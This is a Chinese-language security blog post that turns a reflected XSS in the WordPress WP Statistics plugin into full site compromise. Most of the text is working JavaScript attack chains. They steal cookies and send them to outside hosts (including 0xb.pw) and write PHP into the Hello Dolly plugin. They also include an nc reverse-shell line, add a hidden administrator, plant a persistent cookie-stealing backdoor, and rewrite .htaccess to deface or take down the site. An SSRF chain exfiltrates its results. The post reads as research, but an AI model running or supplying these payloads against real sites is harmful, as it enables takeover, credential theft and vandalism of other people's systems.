---
title: 从瑞士军刀到变形金刚--XSS攻击面拓展
date: 2017-08-23 15:53:43
tags:
- xss
---

这篇文章的原文被我首发在阿里先知社区。

前段时间我阅读了Sucuri Security的brutelogic的一篇博客以及ppt，对xss有了一些新的理解。

在我们真实场景下遇到xss漏洞的时候，我们常常会使用
```
<script>alert(1)</script>
```
来验证站点是否存在漏洞（PoC），为了不触及敏感信息，我们往往不会深入研究XSS的危害程度，很多人都只知道Cross-Site Scripting（XSS）可以窃取cookie，模拟admin请求，但事实上在复杂环境下，我们可以使用XSS完成复杂的攻击链。

<!--more-->

## 测试环境

wordpress v4.8.0(默认配置)
UpdraftPlus v1.13.4
Yoast SEO v5.1
WP Statistics v12.0.9

以下的所有研究会围绕Wordpress 的 WP Statistics爆出的一个后台反射性xss(CVE-2017-10991)作为基础。

[WordPress WP Statistics authenticated xss Vulnerability(WP Statistics <=12.0.9)](https://lorexxar.cn/2017/07/07/WordPress%20WP%20Statistics%20authenticated%20xss%20Vulnerability(WP%20Statistics%20-=12.0.9)/)

## 什么是XSS？

Cross-site scripting（XSS）是一种Web端的漏洞，它允许攻击者通过注入html标签以及JavaScript代码进入页面，当用户访问页面时，浏览器就会解析页面，执行相应的恶意代码。

一般来说，我们通常使用XSS漏洞来窃取用户的Cookie，在httponly的站点中，也可能会使用XSS获取用户敏感信息。

我们从一段简单的php包含xss漏洞的demo代码来简单介绍下XSS漏洞。
```
<?php
$username = $_GET['user'];
echo "Hello, $username";

```

当我们传入普通的username时候，返回是这样的
![image.png-10.5kB][1]

当我们插入一些恶意代码的时候
![image.png-46.5kB][2]

我们插入的`<script>alert(1)</script>`被当作正常的js代码执行了

让我们回到之前的测试环境中

![image.png-111.6kB][3]

我们可以通过一个漏洞点执行我们想要的js代码。

## 盗取Cookie

在一般的通用cms下呢，为了通用模板的兼容性，cms本身不会使用CSP等其他手段来防护xss漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现xss漏洞，我们就可以直接使用xhr来传输cookie。

简单的demo如下
```
<script>
var xml = new XMLHttpRequest(); 
xml.open('POST', 'http://xxxx', true); 
xml.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xml.send('cookie='+document.cookie)
</script>
```

这里我们可以直接使用xhr来传递cookie，但可惜的是，由于wordpress的身份验证cookie是httponly，我们无法使用简单的`documen.cookie`来获取cookie。
![image.png-28.1kB][4]

但无情的是，我们可以通过和别的问题配合来解决这个问题。在这之前，我们先来回顾一种在brutelogic的ppt中提到的xss2rce的利用方式。

通过这其中的思路，我们可以在整个wordpress站点中执行我们想要的任何攻击。

## Xss to Rce

在wordpress的后台，有一个编辑插件的功能，通过这个功能，我们可以直接修改后台插件文件夹的任何内容。

而在默认下载的Wordpress中，都会包含Hello Dolly插件，通过修改这个插件内容并启动插件，我们可以执行想要的任何代码。

但在这之前，我们首先要了解一下，wordpress关于csrf的防御机制，在wordpress中引入了`_wpnonce`作为判断请求来源的参数。

在一般涉及到修改更新等操作的时候，会调用`check_admin_referer()`函数来判断传入的wpnonce是否和该操作计算的nonce值相等，后台部分代码如下：

```
function wp_verify_nonce( $nonce, $action = -1 ) {
	$nonce = (string) $nonce;
	$user = wp_get_current_user();
	$uid = (int) $user->ID;
	if ( ! $uid ) {
		/**
		 * Filters whether the user who generated the nonce is logged out.
		 *
		 * @since 3.5.0
		 *
		 * @param int    $uid    ID of the nonce-owning user.
		 * @param string $action The nonce action.
		 */
		$uid = apply_filters( 'nonce_user_logged_out', $uid, $action );
	}

	if ( empty( $nonce ) ) {
		return false;
	}

	$token = wp_get_session_token();
	$i = wp_nonce_tick();

	// Nonce generated 0-12 hours ago
	$expected = substr( wp_hash( $i . '|' . $action . '|' . $uid . '|' . $token, 'nonce'), -12, 10 );
	if ( hash_equals( $expected, $nonce ) ) {
		return 1;
	}

	// Nonce generated 12-24 hours ago
	$expected = substr( wp_hash( ( $i - 1 ) . '|' . $action . '|' . $uid . '|' . $token, 'nonce' ), -12, 10 );
	if ( hash_equals( $expected, $nonce ) ) {
		return 2;
	}
```

这其中i参数固定，action参数为不同操作的函数名，uid为当前用户的id，token为当前用户cookie中的第三部分。

也就是说，即便不方便读取，我们也可以使用直接计算的方式来获得wpnonce的值，完成攻击。

这里我们使用从页面中读取wpnonce的方式，nonce在页面中是这样的

```
<input type="hidden" id="_wpnonce" name="_wpnonce" value="00b19dcb1a" />
```

代码如下
```
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?php phpinfo();?>';

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&file=hello.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);
```

通过这段js，我们可以向hello.php写入php code。
```
http://127.0.0.1/wordpress4.8/wp-content/plugins/hello.php
```
![image.png-17.5kB][5]

getshell，如果服务端权限没有做设置，我们可以直接system弹一个shell回来，导致严重的命令执行。

```
s = '<?=`nc localhost 5855 -e /bin/bash`;';
```

但正如XSS漏洞存在的意义，getshell或者rce本身都很难替代xss所能达到的效果，我们可以配合php的代码执行，来继续拓展xss的攻击面。

## xss的前端攻击

在wordpress中，对用户的权限有着严格的分级，我们可以构造请求来添加管理员权限的账号，用更隐秘的方式来控制整个站点。

poc:
```
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/user-new.php';
user = 'ddog';
pass = 'ddog';
email = 'ddog@ddog.com';

a = new XMLHttpRequest();
a.open('GET', url+p, 0);
a.send();

ss = '_wpnonce_create-user=' + /nonce_create-user" value="([^"]*?)"/.exec(a.responseText)[1] +
'&action=createuser&email='+email+'&pass1='+pass+'&pass1-text='+pass+'&pass2='+pass+'&pw_weak=on&role=administrator&user_login='+user;

b = new XMLHttpRequest();
b.open('POST', url+p, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

```

后台已经被添加了新的管理员账号
![image.png-8.5kB][6]

但即便是我们通过添加新的管理员账号获取了网站的管理员权限，我们还是不可避免的留下了攻击痕迹，但其实我们通过更隐秘的方式获取admin账号的cookie。

还记得上文中提到的php代码执行吗，利用注入页面的phpinfo，我们可以获取httponly的cookie。

![image.png-34.9kB][7]

当然，我们仍然需要构造连接整个攻击过程的js代码。

```
// 写入phpinfo
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?php phpinfo();?>';

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&file=hello.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

// 请求phpinfo
b.onreadystatechange = function(){
   if (this.readyState == 4) {
      	p_url = url + 'wp-content/plugins/hello.php';

		c = new XMLHttpRequest();
		c.open('GET', p_url, 0);
		c.send();

		sss = /HTTP_COOKIE <\/td><td class="v">[\w=;% \-\+\s]+<\/td/.exec(c.responseText)

		// 将获取到的cookie传出
		var d = new XMLHttpRequest(); 
		d.open('POST', 'http://xxx', true); 
		d.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		d.send('cookie='+sss)
   }
}
```

![image.png-56.9kB][8]

成功收到了来自目标的cookie。

虽然我们成功的收到了目标的cookie，但是这个cookie可能在一段时间之后就无效了，那么怎么能把这样的一个后门转化为持久的攻击呢。这里我还是建议使用hello holly这个插件。

这个插件本身是一个非常特殊的插件，在启用情况下，这个插件会被各个页面所包含，但细心的朋友可能会发现，在前面的攻击过程中，由于我们不遵守插件的页面格式，页面内容被替换为`<?php phpinfo();?>`的过程中，也同样的不被识别为插件，我们需要将页面修改为需要的页面格式，并插入我们想要的代码。

当hello.php为这样时，应该是最简页面内容
```
<?php
/*
Plugin Name: Hello Dolly
Version: 1.6
*/
```

那么我们来构造完整的攻击请求

1、构造xss攻击链接->管理员点击->修改插件目录的hello.php->启动hello, holly插件->访问首页->触发攻击
2、hello.php页面直接获取cookie发出。

hello.php
```
<?php
/*
Plugin Name: Hello Dolly
Version: 1.6
*/
?>
<script>
var d = new XMLHttpRequest(); 
d.open('POST', 'http://xxx', true); 
d.setRequestHeader("Content-type","application/x-www-form-urlencoded");
d.send('cookie=<?php echo urlencode(implode('#', $_COOKIE))?>');
</script>
```

这部分的代码看似简单，实际上还有很大的优化空间，就比如：
1、优化执行条件：通过和远控（xss平台）交互，获取时间戳，和本地时间做对比，如果时间不符合要求不执行，避免管理员在后台的多次访问导致xss平台爆炸。
2、通过代码混淆等方式，将代码混淆入原本的代码中，避免安全类防御工具在站内扫面时发现此页面。

这里我就不做深究了，完整的写入poc如下
```
// 写入后门
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '%3C%3Fphp%0A%2f%2a%0APlugin%20Name%3A%20Hello%20Dolly%0AVersion%3A%201.6%0A%2a%2f%0A%3F%3E%0A%3Cscript%3E%0Avar%20d%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0Ad.open%28%27POST%27%2C%20%27http%3A%2f%2f0xb.pw%27%2C%20true%29%3B%20%0Ad.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3B%0Ad.send%28%27cookie%3D%3C%3Fphp%20echo%20urlencode%28implode%28%27%23%27%2C%20%24_COOKIE%29%29%3F%3E%27%29%3B%0A%3C%2fscript%3E';

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
'&newcontent=' + s + '&action=update&file=hello.php';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

// 开启插件
b.onreadystatechange = function(){
	if (this.readyState == 4) {
		// 解开启插件的请求回来
		c = new XMLHttpRequest();
		c.open('GET', url+'wp-admin/plugins.php', 0);
		c.send();

		sss = /(data-plugin="hello.php)[\w\s"\'<>=\-选择你好多莉\/[\].?&;]+/.exec(c.responseText);
		sss = /plugins.php([\w.?=&;]+)/.exec(sss)[0];
		sss = sss.replace(/&amp;/gi, '&')
		
		// 开启插件
		d = new XMLHttpRequest();
		d.open('GET', url+'wp-admin/'+sss, 0);
		d.send();

		// 跳回首页
		setTimeout('location.href='+url+'wp-admin/',2000);
   }
}
```

![image.png-39.8kB][9]

![image.png-25.1kB][10]

事实上，由于wordpress的特殊性，我们可以通过xss来请求安装插件来简化上面的攻击链，简化整个流程，当我们访问：

```
http://wordpress.site/wp-admin/update.php?action=install-plugin&updraftplus_noautobackup=1&plugin=wp-crontrol&_wpnonce=391ece6c0f
```

wp就会自动安装插件，如果我们将包含恶意代码的模块上传到插件库中，通过上述请求自动安装插件，再启用插件，那么一样可以完整整个攻击。


## xss的破坏式利用

上文中主要是展示了xss配合特性对前端渗透的一些攻击方式，但是很多时候渗透的目的并不一定要隐秘，对于黑产或者其他目的的渗透来说，可能会有一些破坏式的利用方式。

当攻击者的目的并不是为了渗透，而是为了恶作剧、挂黑页，甚至只是为了单纯的搞挂网站，那么就不需要那么复杂的利用链，可以用一些更简单的方法。

```
<img src=//upload.wikimedia.org/wikipedia/commons/f/fd/Hack.png style=width:100%;height:100%>
```

这种方式一般应用于储存性xss漏洞点，比较接近恶作剧性质，因为不会危害到网站安全。

```
<iframe src="xxxxx" style="border:0;position: absolute;top: 0;right: 0;width: 100%;height: 100%" onload="{dom xss}"
```

通过上述payload，我们可以配合xss漏洞来造成点击劫持，或者更复杂的利用方式。这种漏洞一般比较适合新闻类站点的xss漏洞，在wordpress上我没找到合理的利用方式，就不展示demo了，贴一张brutelogic在ppt中的demo截图。

![image.png-432.7kB][11]

红箭头指向的标题是被xss修改后的标题。配合一些社工手段，这样的利用方式可能会造成大于攻击网站本身的破坏。

当然，还可以有更彻底的方式。在wordpress的插件yoast seo中，包含一个自带的功能可以修改整战根目录的.htaccess文件。

通过修改.htaccess，我可以直接让整个站跳到黑页、广告页等，达成我们想要的目的。

```

url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/admin.php?';
q = 'page=wpseo_tools&tool=file-editor';
s = "%23%20BEGIN%20WordPress%0A%3CIfModule%20mod_rewrite.c%3E%0ARedirect%20%2fwordpress4.8%20https%3A%2f%2florexxar.cn%0A%3C%2fIfModule%3E%0A%23%20END%20WordPress";


a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + a.responseText.match(/nonce" value="([^"]*?)"/g)[1].match(/\w+/g)[2] +
'&htaccessnew=' + s + '&submithtaccess=Save+changes+to+.htaccess';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);
```

甚至如果想要使整个站出错，可以直接设置.htaccess内容为`deny from all`，那样整个站就会返回403，拒绝用户访问。

当然除了攻击网站以外，我们可以通过使用xss来注入恶意payload到页面，当用户访问页面时，会不断地向目标发起请求，当网页的用户量达到一定级别时，可以以最低的代价造成大流量的ddos攻击。几年前就发生过类似的事情，攻击者利用搜狐视频评论的储存型xss，对目标产生了大流量的ddos，这种攻击成本低，持续时间长，对攻击者还有很强的隐秘性。

[http://www.freebuf.com/news/33385.html](http://www.freebuf.com/news/33385.html)

攻击和防护的一些思路见
[https://www.incapsula.com/blog/world-largest-site-xss-ddos-zombies.html](https://www.incapsula.com/blog/world-largest-site-xss-ddos-zombies.html)

在前面部分的内容，花了大篇幅来描述XSS在前台中的影响，关于后台的部分只有一部分通过编辑插件实现的XSS to Rce.但实际上还有更多拓展的可能。

## XSS的后端利用

这里首先介绍一个WordPress的插件UpdraftPlus，这是一个用于管理员备份网站的插件，用户量非常大，基本上所有的wordpress使用者都会使用UpdraftPlus来备份他们的网站，在这个插件中，集成了一些小工具，配合我们xss，刚好可以实现很多特别的攻击链。

首先是phpinfo，前面提到，我们可以修改hello holly这个插件来查看phpinfo，但是如果这个默认插件被删除了，而且又没有合适的方式隐藏phpinfo页面，那么我们可以通过UpdarftPlus来获取phpinfo内容。

这个链接地址为
```
wp-admin/admin-ajax.php?page=updraftplus&action=updraft_ajax&subaction=phpinfo&nonce=cbe6c0b062
```

除了phpinfo以外，我们还可以使用内建的curl工具，这个工具没有对请求地址做任何限制，那么我们就可以使用这个工具来ssrf或者扫描内网。

curl的链接
```
wp-admin/admin-ajax.php?action=updraft_ajax&subaction=httpget&nonce=2f2f07ce90&uri=http://127.0.0.1&curl=1
```

配合js，poc如下：
```

url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/options-general.php?';
p2 = 'wp-admin/admin-ajax.php?';
q = 'page=updraftplus&tab=addons';
s = "http://111111111";

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

q2 = 'nonce=' + /credentialtest_nonce='([^']*?)'/.exec(a.responseText)[1] +
'&uri=' + s + '&action=updraft_ajax&subaction=httpget&curl=1';

// 发起请求
b = new XMLHttpRequest();
b.open('GET', url+p2+q2, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send();

b.onload = function(){
	if (this.readyState == 4) {
		// 传出请求结果
		var c = new XMLHttpRequest(); 
		c.open('POST', 'http://0xb.pw', true); 
		c.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		c.send('result='+encodeURIComponent(b.responseText))
	}
}
```
![image.png-57.6kB][12]

请求成功了，事实上，如果XSS的交互脚本写的足够好，这里完全可以实现对内网的渗透。


## END：拓展与思考

整篇文章其实是我在对wordpress源码审计时候的一些思考，对于大部分通用类的cms，开发者往往过于相信超级管理员，其中wordpress就是典型代表，开发者认为，网站的超级管理员应该保护好自己的账户。

在这种情况下，一个后台的反射形XSS漏洞往往会造成远远超过预期的危害。一个反射性XSS配合一些设计问题会导致全站的沦陷。

但反射性XSS总有一些缺点
1、指向性明显，链接必须要网站的超级管理员点击才有效，在实际使用中，你可能很难获知网站的超级管理员是谁。
2、必须点击链接，最低要求也必须要访问包含你恶意链接的页面。

幸运的是，我们仍然有拓展攻击的方式，在@呆子不开口 FIT2017的议题中，他提到一部分poc的反分析办法，根据这个思路，我们优化我们的poc。

![image.png-47.2kB][13]

一个完成的恶意链接，甚至可以搭配上js蠕虫，将入侵成功的站点再次演变为新的恶意链接，这样整个攻击链就形成了。

上面所有涉及到的js都上传到了我的[github](https://github.com/LoRexxar/xss_essay)上。欢迎讨论

## 参考

- [1]:[https://docs.google.com/presentation/d/1v3Me8IWDuvSb1k96UB5RNyXE-hLHk0i6cf5MDJMaxuY/pub?slide=id.g1e7ce7e503_0_49](https://docs.google.com/presentation/d/1v3Me8IWDuvSb1k96UB5RNyXE-hLHk0i6cf5MDJMaxuY/pub?slide=id.g1e7ce7e503_0_49)
- [2]:[https://brutelogic.com.br/blog/compromising-cmses-xss/](https://brutelogic.com.br/blog/compromising-cmses-xss/)
- [3]:[https://github.com/LoRexxar/xss_essay](https://github.com/LoRexxar/xss_essay)
- [4]:[https://lorexxar.cn/2017/07/07/WordPress%20WP%20Statistics%20authenticated%20xss%20Vulnerability(WP%20Statistics%20-=12.0.9)/](https://lorexxar.cn/2017/07/07/WordPress%20WP%20Statistics%20authenticated%20xss%20Vulnerability(WP%20Statistics%20-=12.0.9)/)
- [5]:[https://wordpress.org](https://wordpress.org)
- [6]:[https://www.incapsula.com/blog/world-largest-site-xss-ddos-zombies.html](https://www.incapsula.com/blog/world-largest-site-xss-ddos-zombies.html)


  [1]: http://static.zybuluo.com/LoRexxar/5gqfedhw93m0l2o493dgst32/image.png
  [2]: http://static.zybuluo.com/LoRexxar/kww6v2ictpq6lddemh75jx3z/image.png
  [3]: http://static.zybuluo.com/LoRexxar/ove34bas780053hiabnb2ts8/image.png
  [4]: http://static.zybuluo.com/LoRexxar/o7s4w1t1woqsd80ywkl12sye/image.png
  [5]: http://static.zybuluo.com/LoRexxar/34ryqtulidaxi6r19rstgmrt/image.png
  [6]: http://static.zybuluo.com/LoRexxar/1w7njuxjgsdzutarkk9b7n4b/image.png
  [7]: http://static.zybuluo.com/LoRexxar/lrpbjdj87ac4l1b0v4iwk27v/image.png
  [8]: http://static.zybuluo.com/LoRexxar/y240zcqh29dtqe84zwfyb4ya/image.png
  [9]: http://static.zybuluo.com/LoRexxar/s0h4cv5ir3z9ytdkn4rw69r9/image.png
  [10]: http://static.zybuluo.com/LoRexxar/t74hbh21xgwstf6rmehftm01/image.png
  [11]: http://static.zybuluo.com/LoRexxar/k6fp1b0qibh5a7j7r442oeu4/image.png
  [12]: http://static.zybuluo.com/LoRexxar/ku5sh6qlu6ygb4v3v8mm1wxy/image.png
  [13]: http://static.zybuluo.com/LoRexxar/o6sgylp105ljwhiqc8b88goa/image.png